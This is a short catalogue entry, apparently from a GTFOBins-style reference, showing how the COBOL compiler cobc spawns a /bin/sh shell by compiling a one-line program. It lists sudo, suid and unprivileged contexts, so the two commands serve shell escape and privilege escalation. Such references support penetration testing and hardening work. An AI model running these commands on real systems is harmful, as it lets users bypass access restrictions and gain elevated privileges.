---
type: gtfobin
name: cobc
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# cobc

## shell

```bash
echo 'CALL "SYSTEM" USING "/bin/sh".' >/path/to/temp-file
cobc -xFj --frelax-syntax-checks /path/to/temp-file
```
_The `/path/to/temp-file` sill be overwritten after the execution._
**Contexts:** sudo, suid, unprivileged
